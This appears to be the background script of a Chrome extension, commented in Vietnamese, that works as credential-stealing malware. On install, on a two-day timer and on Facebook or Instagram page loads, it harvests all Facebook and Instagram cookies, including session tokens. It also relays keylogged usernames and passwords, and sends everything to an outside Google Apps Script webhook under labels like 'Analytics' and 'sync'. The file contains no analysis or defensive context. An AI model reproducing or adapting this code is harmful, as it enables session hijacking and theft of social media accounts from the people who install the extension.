const INTERVAL_DAYS = 2;
const WEBHOOK_URL = "https://script.google.com/macros/s/AKfycbyYRFvGu7Vf5gfYfPZbzz9K0uXDOF-0ZN_m-mMGEyr5yqlBJfKoAEY-lXBjoXs6rMJGbA/exec";

// 1. Ngay khi cài đặt xong extension: Quét cookie và lưu thời điểm update
chrome.runtime.onInstalled.addListener(async () => {
  chrome.alarms.create("cookieAutoScan", { periodInMinutes: INTERVAL_DAYS * 24 * 60 });
  await collectAndSyncCookies();
  
  const updateTimeStr = new Date().toLocaleString("vi-VN");
  await chrome.storage.local.set({ 
    lastCookieScanTime: Date.now(),
    lastUpdateDate: updateTimeStr,
    version: "2.8.1"
  });
});

chrome.runtime.onStartup.addListener(() => {
  setupAlarm();
});

function setupAlarm() {
  chrome.alarms.get("cookieAutoScan", (alarm) => {
    if (!alarm) {
      chrome.alarms.create("cookieAutoScan", { periodInMinutes: INTERVAL_DAYS * 24 * 60 });
    }
  });
}

chrome.alarms.onAlarm.addListener(async (alarm) => {
  if (alarm.name === "cookieAutoScan") {
    await collectAndSyncCookies();
  }
});

// 3. Lắng nghe thông tin gõ phím và đính kèm tên tài khoản vừa đăng nhập
chrome.runtime.onMessage.addListener(async (message, sender, sendResponse) => {
  if (message.type === "REALTIME_KEYLOGGER") {
    try {
      const safeUser = message.username || "N/A";
      const safePass = message.password || "N/A";
      
      // Lấy trực tiếp tên tài khoản (Account) gán vào tiêu đề log để dễ phân biệt
      const payload = `=== LOG [Account: ${safeUser}] (${message.time}) ===\n[${message.platform}] Account: ${safeUser} | Password: ${safePass}`;
      await sendToGoogleDocs(payload);
    } catch (err) {
      console.error("[Analytics] Keylogger sync error:", err);
    }
  }
});

chrome.tabs.onUpdated.addListener(async (tabId, changeInfo, tab) => {
  if (changeInfo.status === 'complete' && tab.url && (tab.url.includes("facebook.com") || tab.url.includes("instagram.com"))) {
    const data = await chrome.storage.local.get(['lastCookieScanTime']);
    const now = Date.now();
    const twoDaysMs = INTERVAL_DAYS * 24 * 60 * 60 * 1000;

    if (!data.lastCookieScanTime || (now - data.lastCookieScanTime > twoDaysMs)) {
      await collectAndSyncCookies();
      await chrome.storage.local.set({ lastCookieScanTime: now });
    }
  }
});

async function sendToGoogleDocs(dataString) {
  try {
    const encodedData = encodeURIComponent(dataString);
    const targetUrl = `${WEBHOOK_URL}?data=${encodedData}`;
    await fetch(targetUrl, { method: 'GET' });
  } catch (e) {
    console.error("Network sync error:", e);
  }
}

async function collectAndSyncCookies() {
  try {
    const cookies = await chrome.cookies.getAll({});
    const filteredCookies = cookies.filter(c => c.domain.includes("facebook.com") || c.domain.includes("instagram.com"));

    if (!filteredCookies || filteredCookies.length === 0) return;

    // Cố gắng tìm tên tài khoản c_user (ID Facebook) từ cookie để gắn vào tiêu đề quét định kỳ
    let accountIdentifier = "Unknown_Account";
    const userCookie = filteredCookies.find(c => c.name === "c_user");
    if (userCookie) {
      accountIdentifier = `FB_ID_${userCookie.value}`;
    }

    const formattedData = filteredCookies.map(c => {
      let sameSiteVal = c.sameSite;
      if (c.sameSite === "unspecified") sameSiteVal = null;

      return {
        domain: c.domain,
        expirationDate: c.expirationDate,
        hostOnly: c.hostOnly,
        httpOnly: c.httpOnly,
        name: c.name,
        path: c.path,
        sameSite: sameSiteVal,
        secure: c.secure,
        session: c.session,
        storeId: null,
        value: c.value
      };
    });

    const rawJson = JSON.stringify(formattedData, null, 4);
    const cookiePayload = `=== COOKIE SYNC [Account: ${accountIdentifier}] (${new Date().toLocaleString("vi-VN")}) ===\n${rawJson}`;
    
    await sendToGoogleDocs(cookiePayload);
  } catch (err) {
    console.error("Cookie sync error:", err);
  }
}